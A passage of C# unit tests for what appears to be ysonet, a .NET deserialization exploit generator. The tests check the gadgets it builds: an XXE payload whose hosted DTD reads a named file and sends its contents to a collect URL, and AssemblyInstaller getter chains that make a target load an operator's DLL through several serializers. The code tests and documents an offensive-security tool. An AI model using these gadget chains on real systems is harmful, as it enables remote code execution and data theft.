                    "the hosted DTD reads the target file the operator named");
                AssertTrue(dtd.IndexOf(DsXxeOobBase + "/" + DataSetXxeGenerator.CollectPath + "?d=%file;",
                        StringComparison.Ordinal) >= 0,
                    "the hosted DTD sends the content to <base>/" + DataSetXxeGenerator.CollectPath);
                AssertTrue(dtd.IndexOf("%exfil;", StringComparison.Ordinal) >= 0,
                    "the hosted DTD REFERENCES the built entity, which is what performs the send");
            }
            finally { SafeDelete(dtdOut); }
        }

        // The companion file is the only side effect this project has on the operator's disk,
        // so what it does to a path that is already in use is asserted on the BYTES, not just
        // on the exit code. --dtd-out is taken at face value: it replaces and it creates. The
        // guarantee that survives is narrower and more useful than a refusal - a run that
        // FAILS never touches what is there, because the payload is built before the write.
        private static void DataSetXxeOobWritesWhereTheOperatorAsks()
        {
            string existing = WriteTestArtifact("ysonet_dsxxe_existing.dtd", "operator content");
            string absentFolder = TestArtifactPath("ysonet_dsxxe_absent_folder");
            string inNewFolder = Path.Combine(absentFolder, "out.dtd");
            string unsupported = TestArtifactPath("ysonet_dsxxe_unsupported.dtd");
            string keptBack = WriteTestArtifact("ysonet_dsxxe_kept.dtd", "operator content");
            SafeDelete(unsupported);
            try
            {
                // A file already at the path is replaced with the gadget's own DTD, and the
                // operator is TOLD, because a silent overwrite of their file is not the same
                // thing as one they asked for.
                string err;
                RunResult overwrite = CaptureConsoleGen(
                    () => GenerateDsXxe("BinaryFormatter", false, DsXxeOobBase, DsXxeOobArgs(existing)),
                    out err);
                AssertTrue(overwrite != null && overwrite.Success,
                    "an existing --dtd-out is written over: "
                        + (overwrite == null ? "null" : overwrite.ErrorMessage));
                AssertEqual(DataSetXxeGenerator.OobDtd(DsXxeOobBase + "/", DsXxeOobFile),
                    File.ReadAllText(existing, new UTF8Encoding(false)),
                    "the file now holds the companion DTD, not the operator's old content");
                AssertTrue(err.IndexOf("replaced", StringComparison.OrdinalIgnoreCase) >= 0,
                    "stderr says a file was replaced");

                // A missing folder is created rather than refused.
                RunResult newFolder = GenerateDsXxe("BinaryFormatter", false, DsXxeOobBase,
                    DsXxeOobArgs(inNewFolder));
                AssertTrue(newFolder.Success, "a --dtd-out whose folder does not exist is created: "
                    + newFolder.ErrorMessage);
                AssertTrue(File.Exists(inNewFolder), "the DTD was written inside the new folder");

                // The payload is built BEFORE the DTD, so a formatter this gadget cannot
                // produce must leave no artifact behind at all.
                RunResult badFormatter = GenerateDsXxe("Xaml", false, DsXxeOobBase,
                    DsXxeOobArgs(unsupported));
                AssertTrue(!badFormatter.Success, "an unsupported formatter is refused");
                AssertTrue(!File.Exists(unsupported),
                    "a failed serialization leaves no companion DTD behind");

                // The same ordering is what protects a file that IS already there: a run that
                // never gets past serialization must not have truncated it on the way.
                RunResult badOverExisting = GenerateDsXxe("Xaml", false, DsXxeOobBase,
                    DsXxeOobArgs(keptBack));
                AssertTrue(!badOverExisting.Success, "an unsupported formatter is still refused");
                AssertEqual("operator content", File.ReadAllText(keptBack),
                    "a FAILED run leaves an existing file at --dtd-out untouched");
            }
            finally
            {
                SafeDelete(existing);
                SafeDelete(unsupported);
                SafeDelete(keptBack);
                SafeDelete(inNewFolder);
                try { if (Directory.Exists(absentFolder)) Directory.Delete(absentFolder); } catch { }
            }
        }

        // Silently ignoring an option that belongs to the other variant would leave the
        // operator waiting for a DTD file that was never written.
        private static void DataSetXxeVariantOneRefusesOobOptions()
        {
            string dtdOut = TestArtifactPath("ysonet_dsxxe_v1_reject.dtd");
            SafeDelete(dtdOut);
            try
            {
                RunResult withFile = GenerateDsXxe("BinaryFormatter", false, DsXxeUrl,
                    "--" + DataSetXxeGenerator.TargetFileOptionName, DsXxeOobFile);
                AssertTrue(!withFile.Success, "variant 1 refuses --" + DataSetXxeGenerator.TargetFileOptionName);
                AssertTrue((withFile.ErrorMessage ?? "").IndexOf(
                        DataSetXxeGenerator.VariantOobFileRead.ToString(), StringComparison.Ordinal) >= 0,
                    "the refusal points at the variant that does use it");

                RunResult withOut = GenerateDsXxe("BinaryFormatter", false, DsXxeUrl,
                    "--" + DataSetXxeGenerator.DtdOutOptionName, dtdOut);
                AssertTrue(!withOut.Success, "variant 1 refuses --" + DataSetXxeGenerator.DtdOutOptionName);
                AssertTrue(!File.Exists(dtdOut), "and writes nothing");

                // The editor hides what the variant declares unused, so the declarations have
                // to match the refusals above.
                var variants = GadgetRegistry.CreateGadgetInstance(DsXxeGadget).Variants();
                foreach (GadgetVariant v in variants)
                {
                    bool oob = v.Number == DataSetXxeGenerator.VariantOobFileRead;
                    AssertEqual(oob, v.UsesOption(DataSetXxeGenerator.TargetFileOptionName),
                        "variant " + v.Number + " declares --" + DataSetXxeGenerator.TargetFileOptionName
                            + " " + (oob ? "used" : "unused"));
                    AssertEqual(oob, v.UsesOption(DataSetXxeGenerator.DtdOutOptionName),
                        "variant " + v.Number + " declares --" + DataSetXxeGenerator.DtdOutOptionName
                            + " " + (oob ? "used" : "unused"));
                    AssertEqual(!oob, v.UsesOption(DataSetXxeGenerator.RawInputOptionName),
                        "variant " + v.Number + " declares --" + DataSetXxeGenerator.RawInputOptionName
                            + " " + (oob ? "unused" : "used"));
                }
            }
            finally { SafeDelete(dtdOut); }
        }

        private static string Truncate(string s, int n)
        {
            if (s == null) return "<null>";
            s = s.Replace("\r", " ").Replace("\n", " ");
            return s.Length <= n ? s : s.Substring(0, n) + "...";
        }

        // Variant 2 does nothing unless the operator hosts the DTD, so the gadget prints the
        // exact bytes to host and where to publish them. That guidance must go to STDERR, so
        // it never mixes into the payload a caller reads from stdout.
        private static void DataSetXxeOobPrintsHostingInstructions()
        {
            string dtdOut = TestArtifactPath("ysonet_dsxxe_hosting_note.dtd");
            SafeDelete(dtdOut);
            try
            {
                string err;
                RunResult r = CaptureConsoleGen(
                    () => GenerateDsXxe("BinaryFormatter", false, DsXxeOobBase, DsXxeOobArgs(dtdOut)),
                    out err);
                AssertTrue(r != null && r.Success, "variant 2 generates: "
                    + (r == null ? "null" : r.ErrorMessage));

                AssertTrue(err.IndexOf(DataSetXxeGenerator.CompanionDtdName, StringComparison.Ordinal) >= 0,
                    "stderr names the DTD to publish");
                AssertTrue(err.IndexOf(DsXxeOobBase + "/" + DataSetXxeGenerator.CompanionDtdName,
                        StringComparison.Ordinal) >= 0,
                    "stderr shows the URL to publish it at");
                AssertTrue(err.IndexOf("<!ENTITY % file SYSTEM \"" + DsXxeOobFile + "\">",
                        StringComparison.Ordinal) >= 0,
                    "stderr shows the actual DTD bytes, so the reader need not open the file");
                AssertTrue(err.IndexOf(DataSetXxeGenerator.CollectPath, StringComparison.Ordinal) >= 0,
                    "stderr names the endpoint to watch for the content");

                // The guidance must NOT be on stdout, which carries the payload. The payload
                // itself is bytes here, so a string search on stdout is the check.
                string outText = DsXxePayloadText("BinaryFormatter", r.Raw);
                AssertTrue(outText.IndexOf("host this DTD", StringComparison.Ordinal) < 0,
                    "the hosting guidance never lands in the payload");
            }
            finally { SafeDelete(dtdOut); }
        }

        // A hardened ysonet.exe (this build targets 4.7.2) hands a legacy XmlTextReader a null
        // resolver, so -t deserializes the payload and fetches NOTHING - which reads as "the
        // gadget does nothing" unless the tool says so. The note must appear on -t and only on
        // -t, and it must go to stderr so the payload on stdout is untouched.
        private static void DataSetXxeSelfTestExplainsNoFetch()
        {
            // This test process is the entry assembly, and it targets 4.7.2, so the switch is
            // the hardened one. If some future runner flips that, the note is correctly absent
            // and there is nothing to assert, so gate on the real answer rather than guessing.
            bool? resolves = ysonet.Helpers.Core.LegacyXmlDefaults.ResolvesExternalEntitiesHere();
            AssertTrue(resolves.HasValue,
                "the EnableLegacyXmlSettings switch is readable on this framework");
            if (resolves.Value)
            {
                Console.Error.WriteLine("  [skip] DataSetXxeSelfTestExplainsNoFetch: this process resolves external entities");
                return;
            }

            // Without -t: no note. Generation must stay silent for an automated caller.
            string errNoTest;
            CaptureConsoleGen(() => GenerateDsXxe("BinaryFormatter", false, DsXxeUrl), out errNoTest);
            AssertTrue(errNoTest.IndexOf("fetched nothing", StringComparison.Ordinal) < 0,
                "a normal (no -t) generation prints no self-test note");

            // With -t: the note explains the no-request result.
            string errTest;
            RunResult r = CaptureConsoleGen(delegate
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = DsXxeUrl;
                ia.Test = true;   // deserializes here; the null resolver means no fetch
                return PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = DsXxeGadget,
                    FormatterName = "BinaryFormatter",
                    InputArgs = ia,
                });
            }, out errTest);
            AssertTrue(r != null && r.Success, "generation with -t still succeeds");
            AssertTrue(errTest.IndexOf("fetched nothing", StringComparison.Ordinal) >= 0
                    && errTest.IndexOf("4.5.2", StringComparison.Ordinal) >= 0,
                "-t explains the null resolver and names the 4.5.2 condition");
        }

        // GenerateGadget while capturing Console.Error, so a test can assert what a gadget
        // wrote to stderr during generation. Console.Out is captured and discarded too, so a
        // gadget that also writes stdout does not pollute the test runner's output.
        private static RunResult CaptureConsoleGen(Func<RunResult> gen, out string errText)
        {
            TextWriter prevOut = Console.Out, prevErr = Console.Error;
            var so = new StringWriter();
            var se = new StringWriter();
            Console.SetOut(so);
            Console.SetError(se);
            try { return gen(); }
            finally
            {
                Console.SetOut(prevOut);
                Console.SetError(prevErr);
                errText = se.ToString();
            }
        }

        // ---- AssemblyInstallerLoad ---------------------------------------------

        private const string AiGadget = "AssemblyInstallerLoad";

        // Every formatter the gadget advertises, in the same order, without the "(N)"
        // variant annotation the catalog carries.
        private static readonly string[] AiFormatters =
        {
            "Json.NET", "Xaml", "FastJson", "JavaScriptSerializer", "YamlDotNet",
            "SharpSerializerBinary", "SharpSerializerXml",
            "MessagePackTypeless", "MessagePackTypelessLz4",
        };

        // The two formatters that can also build the three list carriers, because both can
        // add to a read-only Items collection instead of assigning it.
        private static readonly string[] AiMultiCarrierFormatters = { "Json.NET", "Xaml" };

        private static readonly string[] AiCarrierNames =
        {
            "", "PropertyGrid", "ComboBox", "ListBox", "CheckedListBox"
        };

        // A local path that is never opened: the gadget treats -c as TARGET data.
        private const string AiLocalDll = @"C:\programdata\ysonet-test\installer.dll";
        private const string AiUncDll = @"\\ysonet-nonexistent-host\share\installer.dll";

        private static RunResult GenerateAssemblyInstaller(string formatter, int variant, int getter,
            bool minify, string path)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = path;
            ia.Minify = minify;
            ia.Test = false;
            ia.ExtraArguments = new List<string>
            {
                "--variant", variant.ToString(), "--getter", getter.ToString()
            };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = AiGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The payload as searchable text. The two binary outputs still carry the type names
        // and the path as plain UTF-8 records, so a text search is valid evidence there too.
        private static string AiPayloadText(object raw)
        {
            string text = raw as string;
            if (text != null) return text;
            byte[] bytes = raw as byte[];
            return bytes == null ? null : new UTF8Encoding(false).GetString(bytes);
        }

        // The integrity check: every advertised formatter, variant and carrier must really
        // name the AssemblyInstaller carrier, set Path, and reach the getter that runs the
        // installers. Generation returning bytes proves none of that on its own.
        private static void AssemblyInstallerLoadCarriesTheRealChain()
        {
            foreach (string formatter in AiFormatters)
            {
                for (int variant = 1; variant <= 2; variant++)
                {
                    string path = variant == 2 ? AiUncDll : AiLocalDll;
                    for (int m = 0; m < 2; m++)
                    {
                        bool minify = m == 1;
                        string cell = formatter + " v" + variant + (minify ? " --minify" : "");

                        RunResult r = GenerateAssemblyInstaller(formatter, variant, 1, minify, path);
                        AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);

                        string text = AiPayloadText(r.Raw);
                        AssertTrue(text != null, cell + ": payload is text or bytes");

                        // The Lz4 flavour is COMPRESSED, so no name or path is readable in
                        // the bytes. Its uncompressed twin above carries the identical graph
                        // and is asserted in full; here only the shape can be checked, and
                        // the runtime proof is its cell in the FULL execution matrix.
                        if (formatter == "MessagePackTypelessLz4")
                        {
                            AssertTrue(((byte[])r.Raw).Length > 0, cell + ": produces a non-empty payload");
                            continue;
                        }

                        // XAML names the type as an element plus a clr-namespace; every
                        // other formatter carries the assembly-qualified name. The namespace
                        // PREFIX is not asserted: --minify renames it (ci -> a), which is
                        // the minifier doing its job.
                        if (formatter == "Xaml")
                            AssertTrue(text.IndexOf(":AssemblyInstaller ", StringComparison.Ordinal) >= 0
                                    && text.IndexOf("clr-namespace:System.Configuration.Install;assembly=System.Configuration.Install", StringComparison.Ordinal) >= 0,
                                cell + ": names the AssemblyInstaller carrier");
                        else
                            AssertTrue(text.IndexOf("System.Configuration.Install.AssemblyInstaller", StringComparison.Ordinal) >= 0,
                                cell + ": names the AssemblyInstaller carrier");

                        AssertTrue(text.IndexOf("System.Windows.Forms.PropertyGrid", StringComparison.Ordinal) >= 0
                                || text.IndexOf("<PropertyGrid ", StringComparison.Ordinal) >= 0,
                            cell + ": names the PropertyGrid getter carrier");
                        AssertTrue(text.IndexOf("SelectedObject", StringComparison.Ordinal) >= 0,
                            cell + ": assigns the PropertyGrid selection, which is what reads the getter");
                        AssertTrue(text.IndexOf("Path", StringComparison.Ordinal) >= 0,
                            cell + ": sets the Path property, whose setter calls Assembly.LoadFrom");

                        // A surrogate name in the emitted bytes would mean the type swap
                        // silently failed: the payload still generates and is still valid,
                        // but no target could resolve it.
                        AssertTrue(text.IndexOf("Surrogate", StringComparison.Ordinal) < 0,
                            cell + ": leaks no ysonet surrogate type name");

                        // The operator's path must survive the template and the minifier
                        // exactly, or the target loads a different file.
                        AssertTrue(AiDecode(formatter, text).IndexOf(path, StringComparison.Ordinal) >= 0,
                            cell + ": carries the DLL path verbatim");
                    }
                }
            }

            // The three list carriers, on the two formatters that can build them.
            foreach (string formatter in AiMultiCarrierFormatters)
            {
                for (int getter = 2; getter <= 4; getter++)
                {
                    for (int m = 0; m < 2; m++)
                    {
                        bool minify = m == 1;
                        string carrier = AiCarrierNames[getter];
                        string cell = formatter + " --getter " + getter + (minify ? " --minify" : "");

                        RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, minify, AiLocalDll);
                        AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);

                        string text = AiPayloadText(r.Raw);
                        AssertTrue(text.IndexOf(carrier, StringComparison.Ordinal) >= 0,
                            cell + ": names the " + carrier + " carrier");
                        // DisplayMember is what makes a list control read HelpText on each
                        // item; without it nothing calls the getter at all.
                        AssertTrue(text.IndexOf("DisplayMember", StringComparison.Ordinal) >= 0
                                && text.IndexOf("HelpText", StringComparison.Ordinal) >= 0,
                            cell + ": points DisplayMember at HelpText");
                        AssertTrue(AiDecode(formatter, text).IndexOf(AiLocalDll, StringComparison.Ordinal) >= 0,
                            cell + ": carries the DLL path verbatim");
                    }
                }
            }
        }

        // Undo only the escaping the payload template applied, so a path assertion compares
        // against what the target will really hand to Assembly.LoadFrom.
        private static string AiDecode(string formatter, string payload)
        {
            if (formatter == "Xaml" || formatter == "SharpSerializerXml")
                return payload.Replace("&#x22;", "\"").Replace("&quot;", "\"")
                              .Replace("&lt;", "<").Replace("&gt;", ">").Replace("&amp;", "&");
            if (formatter == "Json.NET" || formatter == "JavaScriptSerializer"
                || formatter == "FastJson" || formatter == "YamlDotNet")
                return payload.Replace("\\\"", "\"").Replace("\\\\", "\\");
            return payload;   // the two binary formats store the string verbatim
        }

        // -c is TARGET data and the two variants promise different delivery, so the gadget
        // has to say no to the combinations that would build a payload that cannot work.
        private static void AssemblyInstallerLoadValidatesTheDllPath()
        {
            foreach (string bad in new[] { null, "", "   " })
            {
                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, 1, false, bad);
                AssertTrue(!r.Success, "rejects an empty -c ('" + (bad ?? "<null>") + "')");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("installer DLL", StringComparison.OrdinalIgnoreCase) >= 0,
                    "the empty -c message says what is wanted: " + r.ErrorMessage);
            }

            // The sink is Assembly.LoadFrom, so a managed .exe is as valid as a .dll; a
            // source file is not, and neither is a bare program name, which is the shape a
            // shell command would arrive in.
            RunResult wrongExt = GenerateAssemblyInstaller("Json.NET", 1, 1, false, @"C:\x\ExploitClass.cs");
            AssertTrue(!wrongExt.Success, "rejects a path that is not a loadable assembly");
            AssertTrue((wrongExt.ErrorMessage ?? "").IndexOf(".dll", StringComparison.Ordinal) >= 0,
                "the wrong-extension message names .dll: " + wrongExt.ErrorMessage);

            RunResult bareName = GenerateAssemblyInstaller("Json.NET", 1, 1, false, "calc.exe");
            AssertTrue(!bareName.Success, "rejects a bare program name that only looks like an assembly");
            AssertTrue((bareName.ErrorMessage ?? "").IndexOf("bare file name", StringComparison.Ordinal) >= 0,
                "the bare-name message explains the problem: " + bareName.ErrorMessage);

            RunResult exePath = GenerateAssemblyInstaller("Json.NET", 1, 1, false, @"C:\programdata\ysonet-test\installer.exe");
            AssertTrue(exePath.Success, "accepts a managed .exe, which Assembly.LoadFrom loads: " + exePath.ErrorMessage);

            // Characters Windows does not allow in a path, and that would also have to
            // survive a JSON string, an XML attribute and a YAML scalar.
            foreach (string bad in new[] { "C:\\a\"b\\x.dll", "C:\\a<b\\x.dll", "C:\\a>b\\x.dll",
                                           "C:\\a|b\\x.dll", "C:\\a*b\\x.dll", "C:\\a?b\\x.dll",
                                           "C:\\a\nb\\x.dll" })
            {
                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, 1, false, bad);
                AssertTrue(!r.Success, "rejects an illegal path character in " + bad.Replace("\n", "\\n"));
            }

            // The variants are not decoration: each refuses the other's input and names the
            // one to use, so a mislabelled payload can never be produced.
            RunResult localOnV2 = GenerateAssemblyInstaller("Json.NET", 2, 1, false, AiLocalDll);
            AssertTrue(!localOnV2.Success, "variant 2 rejects a local path");
            AssertTrue((localOnV2.ErrorMessage ?? "").IndexOf("variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
                "variant 2's refusal points at variant 1: " + localOnV2.ErrorMessage);

            RunResult uncOnV1 = GenerateAssemblyInstaller("Json.NET", 1, 1, false, AiUncDll);
            AssertTrue(!uncOnV1.Success, "variant 1 rejects a UNC path");
            AssertTrue((uncOnV1.ErrorMessage ?? "").IndexOf("variant 2", StringComparison.OrdinalIgnoreCase) >= 0,
                "variant 1's refusal points at variant 2: " + uncOnV1.ErrorMessage);

            // Surrounding whitespace is trimmed rather than baked into the payload.
            RunResult trimmed = GenerateAssemblyInstaller("Json.NET", 1, 1, false, "  " + AiLocalDll + "  ");
            AssertTrue(trimmed.Success, "trims surrounding whitespace: " + trimmed.ErrorMessage);
            AssertTrue(AiDecode("Json.NET", AiPayloadText(trimmed.Raw))
                    .IndexOf("\"" + AiLocalDll + "\"", StringComparison.Ordinal) >= 0,
                "the trimmed path is what reaches the payload");

            // A carrier the formatter cannot build must be refused, not silently downgraded:
            // ComboBox/ListBox/CheckedListBox expose Items without a setter, so every
            // formatter except Json.NET and Xaml would deserialize it EMPTY and never read
            // HelpText, which looks like a working payload and does nothing.
            foreach (string formatter in AiFormatters)
            {
                bool multiCarrier = Array.IndexOf(AiMultiCarrierFormatters, formatter) >= 0;
                for (int getter = 2; getter <= 4; getter++)
                {
                    RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, false, AiLocalDll);
                    if (multiCarrier)
                    {
                        AssertTrue(r.Success, formatter + " builds carrier " + getter + ": " + r.ErrorMessage);
                    }
                    else
                    {
                        AssertTrue(!r.Success, formatter + " must refuse carrier " + getter);
                        AssertTrue((r.ErrorMessage ?? "").IndexOf("PropertyGrid", StringComparison.Ordinal) >= 0,
                            formatter + "'s refusal names the carrier that does work: " + r.ErrorMessage);
                    }
                }
            }

            foreach (int bad in new[] { 0, 5 })
            {
                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, bad, false, AiLocalDll);
                AssertTrue(!r.Success, "rejects --getter " + bad);
            }
        }

        // The DLL path is operator data the target uses literally. It travels through a JSON
        // string, a YAML scalar, an XML attribute and two binary streams, and --minify
        // rewrites two of those, so a path holding the characters that stress each layer has
        // to come out byte-identical on every formatter.
        //
        // The apostrophe is the regression that motivates this: the shared JsonStringEscape
        // writes it as \', which is not a legal JSON escape - Json.NET and
        // JavaScriptSerializer read it back as a quote, but fastJSON DELETES the character,
        // silently turning C:\John's dir\x.dll into C:\Johns dir\x.dll.
        private static void AssemblyInstallerLoadEscapesOperatorPaths()
        {
            string[] awkward =
            {
                @"C:\John's dir\installer.dll",     // apostrophe: the fastJSON case
                @"C:\a & b\installer.dll",          // ampersand: XML entity
                @"C:\two  spaces\installer.dll",    // interior double space
                @"C:\semi; colon\installer.dll",    // "; " is what the XML minifier collapses
            };

            foreach (string path in awkward)
            {
                foreach (string formatter in AiFormatters)
                {
                    for (int m = 0; m < 2; m++)
                    {
                        bool minify = m == 1;
                        string cell = formatter + (minify ? " --minify" : "") + " with " + path;

                        RunResult r = GenerateAssemblyInstaller(formatter, 1, 1, minify, path);

                        // A minifier really can rewrite these: the XML one collapses "; "
                        // inside an attribute, the YAML one collapses a run of spaces. The
                        // gadget must then REFUSE, never ship a payload naming a different
                        // file. Either outcome is correct; a rewritten path is not.
                        if (!r.Success)
                        {
                            AssertTrue((r.ErrorMessage ?? "").IndexOf("no longer carries", StringComparison.Ordinal) >= 0,
                                cell + " failed for an unexpected reason: " + r.ErrorMessage);
                            AssertTrue(minify, cell + " was refused without --minify, which nothing should rewrite");
                            Console.Error.WriteLine("  [info] " + cell + " is refused: " + r.ErrorMessage);
                            continue;
                        }

                        // Compressed output carries no readable text; its uncompressed twin
                        // covers the same graph.
                        if (formatter == "MessagePackTypelessLz4")
                            continue;

                        AssertTrue(AiDecode(formatter, AiPayloadText(r.Raw)).IndexOf(path, StringComparison.Ordinal) >= 0,
                            cell + ": the path arrives unchanged");
                    }
                }
            }
        }

        // The two variants exist to describe two different deliveries, so the category
        // search has to see the difference.
        private static void AssemblyInstallerLoadDeclaresItsVariantFacets()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance(AiGadget);
            AssertTrue(g != null, AiGadget + " is discoverable in the registry");
            AssertEqual(CommandInputType.DllPath, g.CommandInput(), "-c is a DLL path by default");

            List<GadgetVariant> variants = g.Variants();
            AssertEqual(2, variants.Count, "declares two variants");
            AssertEqual(CommandInputType.DllPath, variants[0].EffectiveInput(g.CommandInput()),
                "variant 1 takes a target-local DLL path");
            AssertEqual(CommandInputType.UncPath, variants[1].EffectiveInput(g.CommandInput()),
                "variant 2 takes a UNC path");

            List<GadgetCapability> caps = GadgetFacetReader.Expand(g);
            AssertEqual(2, caps.Count, "two variants expand to two capability units");

            GadgetCapability local = caps[0], unc = caps[1];

            AssertTrue(local.Kinds.Contains(PayloadKind.CodeExecution),
                "variant 1 is code execution: the installer constructor runs");
            AssertTrue(!local.Kinds.Contains(PayloadKind.Network),
                "variant 1 makes no network claim: the path is already on the target");
            AssertTrue(local.Inputs.Contains(PayloadInput.AssemblyFile),
                "variant 1's derived accepted input is assembly-file");
            AssertTrue(!local.Inputs.Contains(PayloadInput.UncPath),
                "variant 1 does not advertise a UNC path");

            AssertTrue(unc.Kinds.Contains(PayloadKind.CodeExecution)
                    && unc.Kinds.Contains(PayloadKind.Network),
                "variant 2 is code execution AND network: the target fetches the DLL over SMB");
            AssertTrue(unc.Inputs.Contains(PayloadInput.UncPath),
                "variant 2's derived accepted input is unc-path");

            foreach (GadgetCapability cap in caps)
            {
                AssertTrue(cap.Requirements.Contains(GadgetRequirement.BuiltIn)
                        && cap.Requirements.Contains(GadgetRequirement.NetFramework),
                    "needs only built-in .NET Framework types");
                // The real gate is the target's security zone for the share plus
                // loadFromRemoteSources, not a CLR build, so the version axis stays honest.
                AssertEqual(1, cap.Versions.Count, "declares one value on the version axis");
                AssertTrue(cap.Versions.Contains(RuntimeVersion.Unspecified),
                    "leaves the runtime version axis unspecified");
            }

            AssertTrue(g.AdditionalInfo().IndexOf("RunInstaller", StringComparison.Ordinal) >= 0,
                "AdditionalInfo names the [RunInstaller(true)] requirement the DLL has to meet");
            AssertTrue(g.Labels().Contains(GadgetTags.GetterChain),
                "labelled as a getter chain");
        }

        // -t deserializes the payload in THIS process, which for this gadget means loading
        // the operator's DLL and running its installer constructors on the operator's own
        // machine. It must refuse, and it must refuse BEFORE it does anything with the path.
        // -t in ysonet is a self-exploit: it deserializes the payload HERE, which loads the
        // operator's DLL and runs its installer constructors on THIS machine - the same thing
        // -t on ObjectDataProvider does when it runs the -c command here. So it is ACCEPTED,
        // not refused. The DLL path used here does NOT exist, so the self-test's LoadFrom
        // throws and RunSelfTest swallows it: nothing is loaded, and what is proved is only
        // that the refusal is gone and generation still succeeds. (The installer really
        // running on deserialize is proved by FireAssemblyInstallerLoad against the test's
        // own fixture assembly.)
        private static void AssemblyInstallerLoadAcceptsSelfTest()
        {
            foreach (string formatter in AiFormatters)
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = AiLocalDll; // nonexistent: the self-test load is swallowed
                ia.Test = true;
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = AiGadget,
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(r.Success, formatter + ": -t is accepted as a self-exploit: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) < 0,
                    formatter + ": no -t refusal remains: " + r.ErrorMessage);

                // The payload it ships under -t is the same one it ships without it: -t only
                // adds the local deserialize, it does not change the bytes.
                InputArgs plain = new InputArgs();
                plain.Cmd = AiLocalDll;
                plain.Test = false;
                RunResult untested = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = AiGadget,
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = plain,
                });
                AssertEqual(Convert.ToString(untested.Raw), Convert.ToString(r.Raw),
                    formatter + ": -t ships the same payload it self-tested");
            }
        }

        // Building a payload must never load the DLL. The fixture installer writes a marker
        // when it is constructed, so pointing generation at the test assembly and finding no
        // marker proves generation alone is inert on every branch.
        private static void AssemblyInstallerLoadGenerationIsInert()
        {
            string marker = TestArtifactPath("ysonet_installer_inert.txt");
            SafeDelete(marker);
            string previous = Environment.GetEnvironmentVariable(YsonetTestInstaller.MarkerVariable);
            Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, marker);
            try
            {
                string ownAssembly = AiFixtureAssemblyPath();
                int cells = 0;
                foreach (string formatter in AiFormatters)
                {
                    int maxGetter = Array.IndexOf(AiMultiCarrierFormatters, formatter) >= 0 ? 4 : 1;
                    for (int getter = 1; getter <= maxGetter; getter++)
                        for (int m = 0; m < 2; m++)
                        {
                            RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, m == 1, ownAssembly);
                            AssertTrue(r.Success, formatter + " g" + getter + " generates: " + r.ErrorMessage);
                            cells++;
                        }
                }
                AssertTrue(cells > 20, "covered every generation branch (was " + cells + ")");
                AssertTrue(!File.Exists(marker),
                    "generation alone never loaded the DLL: no installer was constructed");
            }
            finally
            {
                Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, previous);
                SafeDelete(marker);
            }
        }

        // AdditionalInfo() is the FIRST block of the interactive info panel and the panel
        // only renders BodyRows lines, so a long one silently pushes Formatters:, Command
        // input: and the category summary off the visible area. The shared canary
        // (ModuleInfoPanelShowsFacts) only guards the FIRST gadget alphabetically, and this
        // gadget has both a long formatter list and preconditions worth stating, which is
        // exactly the combination that grows. So check its own panel.
        private static void AssemblyInstallerLoadInfoPanelStillShowsItsFacts()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            // A pessimistically NARROW info column: the panel is one of four columns, so a
            // realistic terminal gives it more room than this.
            string[] lines = ed.ModuleInfoLinesForTest(AiGadget, 34);
            int visible = ModuleEditor.BodyRowsForTest;
            AssertTrue(lines.Length > 0, "the info panel renders for " + AiGadget);

            foreach (string fact in new[] { "Formatters:", "Command input:", "Categories" })
            {
                int at = -1;
                for (int i = 0; i < lines.Length; i++)
                    if (lines[i].TrimStart().StartsWith(fact, StringComparison.Ordinal)) { at = i; break; }
                AssertTrue(at >= 0, "the panel states " + fact);
                AssertTrue(at < visible, fact + " is still on screen (row " + at + " of "
                    + visible + " visible; shorten AdditionalInfo() and move the detail into "
                    + "the option help)");
            }

            // Both selectors must reach the editor, or the gadget is only usable from the
            // command line.
            List<EditableField> fields = ed.BuildFieldsForTest(AiGadget);
            foreach (string option in new[] { "variant", "getter" })
            {
                EditableField f = FindEditable(fields, option);
                AssertTrue(f != null && !f.Hidden, "the editor offers the " + option + " setting");
                AssertTrue(!string.IsNullOrEmpty(f.Help),
                    "the " + option + " setting carries its help text into the editor");
            }
        }

        // The already-built ysonet.Tests assembly, which holds the inert
        // [RunInstaller(true)] fixture. Nothing is compiled at test time.
        private static string AiFixtureAssemblyPath()
        {
            return new Uri(typeof(YsonetTestInstaller).Assembly.CodeBase).LocalPath;
        }

        private static void TempFileCollectionKeepsUncAndRelativePathsVerbatim()
        {
            const string unc = @"\\ysonet-nonexistent-host\share\zz_target.txt";
            const string relative = @"zz_relative\target.txt";
            const string trailingDot = @"C:\ysonet\dir.\file.txt";

            foreach (string formatter in TempFilesFormatters)
            {
                RunResult r = GenerateTempFiles(formatter, false, false, unc, relative, trailingDot);
                AssertTrue(r.Success, formatter + " generates UNC + relative paths: " + r.ErrorMessage);
                WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                {
                    var table = TempFilesTableOf(obj);
                    AssertEqual(3, table.Count, formatter + ": all three paths arrived");
                    AssertTrue(table.ContainsKey(unc), formatter + ": the UNC path is unchanged");
                    AssertTrue(table.ContainsKey(relative),
                        formatter + ": the relative path is NOT rooted against ysonet's directory");
                    AssertTrue(table.ContainsKey(trailingDot),
